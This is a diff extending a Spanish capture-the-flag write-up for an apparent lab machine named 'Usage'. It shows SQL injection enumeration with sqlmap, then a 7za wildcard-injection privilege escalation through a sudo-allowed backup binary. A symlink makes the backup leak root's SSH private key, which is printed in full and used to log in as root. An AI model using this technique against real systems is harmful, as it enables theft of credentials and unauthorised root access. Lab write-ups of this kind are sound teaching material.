@@ -126,8 +126,140 @@ Hacemos lo mismo con las tablas de la base de dados "usage_blog".
 ```bash
 # sqlmap -r requests.txt  --level 5 --risk 3 -p email --batch -D usage_blog --tables
 <contenido omitido>
+Database: usage_blog
+[15 tables]
++------------------------+
+| admin_menu             |
+| admin_operation_log    |
+| admin_permissions      |
+| admin_role_menu        |
+| admin_role_permissions |
+| admin_role_users       |
+| admin_roles            |
+| admin_user_permissions |
+| admin_users            |
+| blog                   |
+| failed_jobs            |
+| migrations             |
+| password_reset_tokens  |
+| personal_access_tokens |
+| users                  |
++------------------------+
 <contenido omitido>
 ```
+
+<br>
+
+# Explotación y acceso
+
+<br>
+
+# Movimiento lateral
+
+<br>
+
+# Escalada de privilegios
+
+Revisamos los permisos de sudo que tiene el usuario xander y vemos que puede ejecutar el programa /usr/bin/usage_management.
+```bash
+xander@usage:~$ sudo -l
+Matching Defaults entries for xander on usage:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User xander may run the following commands on usage:
+    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
+xander@usage:~$
+```
+
+Lo ejecutamos para ver de qué se trata.
+```bash
+xander@usage:~$ sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 
+```
+
+Ejecutamos el comando strings sobre el binario, para ver si consguimos averiguar qué tareas se están ejecutando por detrás.
+La opción 1 (Project Backup) parace que navega hasta la carpeta /var/www/html y crea un comprimido con todos los ficheros que contiene. Vemos que usa el carácter "*" (comodín) que apriori no parece buena idea.
+```bash
+xander@usage:~$ strings /usr/bin/usage_management
+<contenido omitido>
+/var/www/html
+/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
+Error changing working directory to /var/www/html
+<contenido omitido>
+```
+
+Una búsqueda en [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z) nos revela una via potencial de aprovecharnos e intentar escalar privilegios.
+
+Revisamos los permisos de /var/www/html y vemos que todos los usuarios del sistema tienen privilegios para escribir en dicho directorio, lo cual es perfecto para nuestro intento de escalada de privilegios.
+```bash
+xander@usage:~$ ls -la /var/www/
+total 12
+drwxr-xr-x  3 root root   4096 Apr  2  2024 .
+drwxr-xr-x 14 root root   4096 Apr  2  2024 ..
+drwxrwxrwx  4 root xander 4096 Apr  3  2024 html
+xander@usage:~$ 
+```
+
+Ejecutaremos los siguientes comandos, para intentar obtener la id_rsa del usuario root
+```bash
+xander@usage:~$ cd /var/www/html/
+xander@usage:~$ touch @id_rsa
+xander@usage:~$ ln -s /root/.ssh/id_rsa id_rsa
+```
+
+Ejecutamos de nuevo el binario /usr/bin/usage_management, marcando la opción 1.
+```bash
+xander@usage:/var/www/html$ sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+<contenido omitido>
+iles read from disk: 17948
+Archive size: 54830574 bytes (53 MiB)
+
+Scan WARNINGS for files and folders:
+
+-----BEGIN OPENSSH PRIVATE KEY----- : No more files
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
+QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
+AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
+H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
+-----END OPENSSH PRIVATE KEY----- : No more files
+----------------
+Scan WARNINGS: 7
+```
+
+Ya solo nos quedaria formatear correctamente la id_rsa, ganando acceso al sistema con los máximos privilegios.
+```
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
+QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
+AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
+H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
+-----END OPENSSH PRIVATE KEY-----
+```
+```bash
+# chmod 600 id_rsa
+# ssh root@10.10.11.18 -i id_rsa
+<contenido omitido>
+root@usage:~# whoami
+root
+root@usage:~# 
+```
+
+
+
+
+
+
 
 
 
